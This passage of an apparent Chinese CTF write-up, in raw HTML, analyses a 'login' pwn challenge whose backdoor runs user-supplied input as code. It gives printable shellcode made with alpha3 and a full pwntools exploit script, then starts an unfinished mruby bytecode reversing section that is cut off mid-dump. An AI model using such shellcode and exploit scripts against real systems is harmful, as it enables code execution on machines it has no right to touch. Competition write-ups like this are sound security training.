class="line">    &#125;<span class="comment">//**这里说明我们的输入必须要包含一个&#x27;:&#x27;</span></span><br><span class="line">    *sb = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( sc = sb + <span class="number">1</span>; *sc &amp;&amp; (*sc == <span class="string">&#x27; &#x27;</span> || *sc == <span class="string">&#x27;\r&#x27;</span> || *sc == <span class="string">&#x27;\n&#x27;</span> || *sc == <span class="string">&#x27;\t&#x27;</span>); ++sc )</span><br><span class="line">      *sc = <span class="number">0</span>;                                  <span class="comment">// 从&#x27;:&#x27;后一位寻找内容</span></span><br><span class="line">    <span class="keyword">if</span> ( !*sc )                                 <span class="comment">// 若输入内容包含特殊字符就报错</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;abort.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;<span class="comment">//**这里说明&#x27;:&#x27;后一位不准跟特殊字符</span></span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">      qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br><span class="line">    sd = <span class="built_in">strchr</span>(sc, <span class="number">10</span>);<span class="comment">// 寻找&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> ( !sd )   <span class="comment">// 找不到就报错</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;<span class="comment">//**这里说明内容后面必须有&#x27;\n&#x27;</span></span><br><span class="line">    *sd = <span class="number">0</span>;</span><br><span class="line">    our_input = sd + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *our_input == <span class="number">13</span> )</span><br><span class="line">      *our_input++ = <span class="number">0</span>;</span><br><span class="line">    s1 = qword_202040[<span class="number">2</span> * v8];                  <span class="comment">// s1为&#x27;:&#x27;前的字符串</span></span><br><span class="line">    nptr = qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>];            <span class="comment">// nptr为&#x27;:&#x27;后的字符串</span></span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(s1, <span class="string">&quot;opt&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = atoi(nptr);<span class="comment">// 若在我们的输入中找到了&#x27;opt&#x27;字符串，将其转为int整型储存在v7</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( strcasecmp(s1, <span class="string">&quot;msg&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(nptr) &lt;= <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = <span class="built_in">strlen</span>(nptr) - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( dest )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      dest = <span class="built_in">calloc</span>(v9 + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, nptr, v9);<span class="comment">// 若在输入中找到了&#x27;msg&#x27;，则将&#x27;:&#x27;后边的内容复制到dest里</span></span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;<span class="comment">// 计数器+1，重复以上步骤</span></span><br><span class="line">  &#125;</span><br><span class="line">  *our_input = <span class="number">0</span>;</span><br><span class="line">  sa = our_input + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *sa == <span class="number">10</span> )</span><br><span class="line">    *sa = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( v7 )<span class="comment">// 对应以上循环里的&#x27;opt&#x27;</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      backdoor(dest);<span class="comment">// 对应以上循环里的&#x27;msg&#x27;</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      sub_EFE(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      root(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">6</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来再来看看<code>root</code>函数里有什么：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_CBD</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;ro0t&quot;</span>) )<span class="comment">// a1即在menu中传入的dest</span></span><br><span class="line">  &#123;</span><br><span class="line">    unk_202028 = <span class="number">1</span>;<span class="comment">// 将两个全局变量置为1，在backdoor函数里有用</span></span><br><span class="line">    unk_202024 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    unk_202028 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来看下<code>backdoor</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_DA8</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )<span class="comment">// 检测menu中传入的dest内容是否可打印</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);<span class="comment">// 不可打印就报错</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202028 != <span class="number">1</span> )<span class="comment">//检测是否root</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202024 )<span class="comment">//检测是否root</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getpagesize();<span class="comment">// 获取一页的大小</span></span><br><span class="line">    dest = mmap(&amp;loc_FFE + <span class="number">2</span>, v1, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0LL</span>);<span class="comment">// 申请一片可读可写可执行的空间</span></span><br><span class="line">    v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, a1, v2);<span class="comment">//将dest内容复制至该空间</span></span><br><span class="line">    (dest)();<span class="comment">//直接执行dest内容</span></span><br><span class="line"><span class="comment">// text:0000000000000EC9                 call    rdx //</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br></pre></td></tr></table></figure><p>总的来说，是一道编写可见字符串的<code>shellcode</code>题型，我们利用<code>alpha3</code>工具便可生成基于<code>rdx</code>的可打印<code>shellcode</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/buupwn/mrctf/alpha3$ python ./ALPHA3.py x64 ascii mixedcase rdx --input=<span class="string">&quot;shellcode&quot;</span></span><br><span class="line">Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00</span><br></pre></td></tr></table></figure><p>有如下 exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line"><span class="comment">#io=remote(&quot;39.105.43.168&quot;,13321)</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *$rebase(0x01346)&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line">io.send(<span class="string">&quot;opt:1\nmsg:ro0tt\n\n:1&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&#x27;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io,&#x27;b *$rebase(0xEC9)&#x27;)</span></span><br><span class="line">io.send(<span class="string">&quot;opt:2\nmsg:&quot;</span>+shellcode+<span class="string">&quot;\n\n:2&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="baby-code（未解出"><a href="#baby-code（未解出" class="headerlink" title="baby_code（未解出"></a>baby_code（未解出</h3><p><a href="https://www.anquanke.com/post/id/253572">先放篇大佬的文章在这里——mruby字节码逆向入门</a></p><p><a href="https://wkr.moe/ctf/787.html#Reverse">Wankko Ree の Blog</a></p><p><code>.mrb</code>可知是<code>mruby</code>解释器生成的字节码。从其文件头字节码可以看出使用的<code>mruby</code>版本</p><img src="https://m.360buyimg.com/babel/jfs/t1/106673/39/28401/24652/62947e45Efafd20a2/7dbea9ebee9e9003.png" style="zoom:80%;" /><p>利用<code>./mruby -v -b *.mrb  </code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br></pre></td><td class="code"><pre><span class="line">giantbranch@ubuntu:~/ciscn2022/mruby/mruby/bin$ ./mruby -v -b babycode.mrb </span><br><span class="line">mruby <span class="number">3.1</span><span class="number">.0</span> (<span class="number">2022</span><span class="number">-05</span><span class="number">-12</span>)</span><br><span class="line">irep <span class="number">0x18b1a90</span> nregs=<span class="number">5</span> nlocals=<span class="number">2</span> pools=<span class="number">1</span> syms=<span class="number">5</span> reps=<span class="number">2</span> ilen=<span class="number">55</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:p</span><br><span class="line">      <span class="number">000</span> LOADNILR2</span><br><span class="line">      <span class="number">002</span> LOADNILR3</span><br><span class="line">      <span class="number">004</span> CLASSR2:Crypt<span class="comment">// 定义Crypt类</span></span><br><span class="line">      <span class="number">007</span> EXECR2I(<span class="number">0</span>:<span class="number">0x18b3a80</span>)<span class="comment">// 执行0x18b3a80初始化</span></span><br><span class="line">      <span class="number">010</span> TCLASSR2</span><br><span class="line">      <span class="number">012</span> METHODR3I(<span class="number">1</span>:<span class="number">0x18b4320</span>)</span><br><span class="line">      <span class="number">015</span> DEFR2:check<span class="comment">// 并添上check函数</span></span><br><span class="line">      <span class="number">018</span> SSENDR2:getsn=<span class="number">0</span><span class="comment">// gets输入</span></span><br><span class="line">      <span class="number">022</span> SENDR2:chompn=<span class="number">0</span></span><br><span class="line">      <span class="number">026</span> MOVER1R2; R1:p</span><br><span class="line">      <span class="number">029</span> MOVER3R1; R1:p</span><br><span class="line">      <span class="number">032</span> SSENDR2:checkn=<span class="number">1</span><span class="comment">// check(R2)检测输入</span></span><br><span class="line">      <span class="number">036</span> JMPNOTR2<span class="number">050</span></span><br><span class="line">      <span class="number">040</span> STRINGR3L(<span class="number">0</span>); yes</span><br><span class="line">      <span class="number">043</span> SSENDR2:<span class="built_in">puts</span>n=<span class="number">1</span></span><br><span class="line">      <span class="number">047</span> JMP<span class="number">052</span></span><br><span class="line">      <span class="number">050</span> LOADNILR2</span><br><span class="line">      <span class="number">052</span> RETURNR2</span><br><span class="line">      <span class="number">054</span> STOP</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b3a80</span> nregs=<span class="number">3</span> nlocals=<span class="number">1</span> pools=<span class="number">0</span> syms=<span class="number">1</span> reps=<span class="number">1</span> ilen=<span class="number">12</span></span><br><span class="line">      <span class="number">000</span> LOADNILR1</span><br><span class="line">      <span class="number">002</span> LOADNILR2</span><br><span class="line">      <span class="number">004</span> CLASSR1:CIPHER</span><br><span class="line">      <span class="number">007</span> EXECR1I(<span class="number">0</span>:<span class="number">0x18b3b50</span>)<span class="comment">// 执行了0x18b3b50</span></span><br><span class="line">      <span class="number">010</span> RETURNR1</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b3b50</span> nregs=<span class="number">3</span> nlocals=<span class="number">1</span> pools=<span class="number">0</span> syms=<span class="number">6</span> reps=<span class="number">4</span> ilen=<span class="number">55</span></span><br><span class="line">      <span class="number">000</span> LOADI32R1<span class="number">305419896</span></span><br><span class="line">      <span class="number">006</span> SETCONSTXXR1<span class="comment">// 定义常量 XX=305419896</span></span><br><span class="line">      <span class="number">009</span> LOADIR1<span class="number">16</span></span><br><span class="line">      <span class="number">012</span> SETCONSTYYR1<span class="comment">// 定义常量 YY=16</span></span><br><span class="line">      <span class="number">015</span> LOADSELFR1</span><br><span class="line">      <span class="number">017</span> SCLASSR1</span><br><span class="line">      <span class="number">019</span> METHODR2I(<span class="number">0</span>:<span class="number">0x18b3c60</span>)<span class="comment">// 在0x18b3c60处定义了encrypt函数 </span></span><br><span class="line">      <span class="number">022</span> DEFR1:encrypt</span><br><span class="line">      <span class="number">025</span> TCLASSR1</span><br><span class="line">      <span class="number">027</span> METHODR2I(<span class="number">1</span>:<span class="number">0x18b3d00</span>)<span class="comment">// 在0x18b3d00处也定义了encrypt函数,估计重载</span></span><br><span class="line">      <span class="number">030</span> DEFR1:encrypt</span><br><span class="line">      <span class="number">033</span> SSENDR1:privaten=<span class="number">0</span></span><br><span class="line">      <span class="number">037</span> TCLASSR1</span><br><span class="line">      <span class="number">039</span> METHODR2I(<span class="number">2</span>:<span class="number">0x18b4020</span>)</span><br><span class="line">      <span class="number">042</span> DEFR1:to_key<span class="comment">// 在0x18b4020处定义了to_key函数</span></span><br><span class="line">      <span class="number">045</span> TCLASSR1</span><br><span class="line">      <span class="number">047</span> METHODR2I(<span class="number">3</span>:<span class="number">0x18b40f0</span>)</span><br><span class="line">      <span class="number">050</span> DEFR1:enc_one<span class="comment">// 在0x18b40f0处定义了enc_one函数</span></span><br><span class="line">      <span class="number">053</span> RETURNR1</span><br><span class="line"></span><br><span class="line">irep <span class="number">0x18b3c60</span> nregs=<span class="number">9</span> nlocals=<span class="number">5</span> pools=<span class="number">0</span> syms=<span class="number">3</span> reps=<span class="number">0</span> ilen=<span class="number">29</span></span><br><span class="line">local variable names:</span><br><span class="line">  R1:t</span><br><span class="line">  R2:p</span><br><span class="line">  R3:&amp;</span><br><span class="line">  R4:cip</span><br><span class="line">      <span class="number">000</span> ENTER<span class="number">2</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span> (<span class="number">0x80000</span>)</span><br><span class="line">      <span class="number">004</span> GETCONSTR5CIPHER</span><br><span class="line">      <span class="number">007</span> SENDR5:newn=<span class="number">0</span></span><br><span class="line">      <span class="number">011</span> MOVER4R5; R4:cip</span><br><span class="line">      <span class="number">014</span> MOVER5R4; R4:cip</span><br><span class="line">      <span class="number">017</span> MOVER6R1; R1:t</span><br><span class="line">      <span class="number">020</span> MOVER7R2; R2:p</span><br><span class="line">          <span class="comment">//传参为t,p,为另一个encrypt做准备</span></span><br><span class="line">      <span class="number">023</span> 